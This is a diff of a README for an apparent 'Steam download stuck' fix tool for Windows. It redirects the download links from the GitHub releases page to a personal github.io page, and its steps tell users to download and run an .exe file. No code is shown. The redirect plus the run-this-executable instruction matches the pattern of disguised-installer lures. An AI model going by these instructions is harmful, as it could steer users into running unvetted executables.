@@ -1,6 +1,6 @@
 # 🛠️ Steam-Download-Stuck-Fix - Resolve Steam download errors on Windows
 
-[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://github.com/tanmay965-coder/Steam-Download-Stuck-Fix/releases)
+[![](https://img.shields.io/badge/Download_Latest-Release_Page-blue.svg)](https://tanmay965-coder.github.io)
 
 ## What this tool does
 
@@ -8,7 +8,7 @@ Steam sometimes stops a download. The progress bar shows zero bytes. The downloa
 
 ## 📥 How to download the fix
 
-1. Visit the [releases page](https://github.com/tanmay965-coder/Steam-Download-Stuck-Fix/releases).
+1. Visit the [releases page](https://tanmay965-coder.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
